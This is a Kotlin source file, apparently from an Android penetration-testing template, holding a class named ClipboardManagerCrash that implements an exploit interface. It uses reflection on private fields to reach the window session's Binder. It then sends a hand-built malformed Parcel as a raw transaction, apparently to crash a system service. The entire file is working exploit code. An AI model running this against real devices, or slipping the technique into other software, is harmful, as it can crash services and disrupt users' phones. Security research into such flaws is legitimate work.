package org.chickenhook.AndroidHackingTemplate.penetration

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.os.Bundle
import android.os.IBinder
import android.os.Parcel
import android.os.SystemClock
import android.util.Log
import android.view.View

class ClipboardManagerCrash : IExploit {
    @SuppressLint("SoonBlockedPrivateApi")
    override fun launch(context: Context?): Boolean {
        val activity : Activity = context as Activity
        val view = activity.findViewById<View>(android.R.id.content)
        Log.d("TriggerClipboardCrash", "TriggerClipboardCrash View <$view>")
        val mAttachInfoField = View::class.java.getDeclaredField("mAttachInfo")
        mAttachInfoField.isAccessible = true
        val attachInfo = mAttachInfoField.get(view)

        val mWindowSessionField = attachInfo::class.java.getDeclaredField("mSession")
        mWindowSessionField.isAccessible = true
        val mWindowSession = mWindowSessionField.get(attachInfo)

        val mRemoteField = mWindowSession::class.java.getDeclaredField("mRemote")
        mRemoteField.isAccessible = true
        val mWindowSessionBinder = mRemoteField.get(mWindowSession) as IBinder

        val data = Parcel.obtain();
        data.writeInterfaceToken("android.view.IWindowSession")
        data.writeLong(0)
        data.writeLong(0)

        val bundle = Bundle()
        bundle.putString("TEXT", "From SomeTest")
        data.writeBundle(bundle);
        val l1 = intArrayOf(
            0xff00000, // 0x73622a85
            0x00000113,
            0xff00000,
            0xff00000,
            0xff00000,
            0xff00000,
            0xff00000,
            -1,
            -1
        )
        l1.forEach {
            data.writeInt(it)
        }

        val reply = Parcel.obtain()
        SystemClock.sleep(2000)
//        for(i in 0..30) {
//            Log.d("MainActivity", "TriggerClipboardCrash [+] it <$i>")
//            val res = mWindowSessionBinder.transact(i, data, reply, 17)
//            Log.d("MainActivity", "TriggerClipboardCrash [+] res <$res>")
//        }

        val res = mWindowSessionBinder.transact(13, data, reply, 17)
        Log.d("MainActivity", "TriggerClipboardCrash [+] res <$res>")


        SystemClock.sleep(2000)
        return false;
    }
}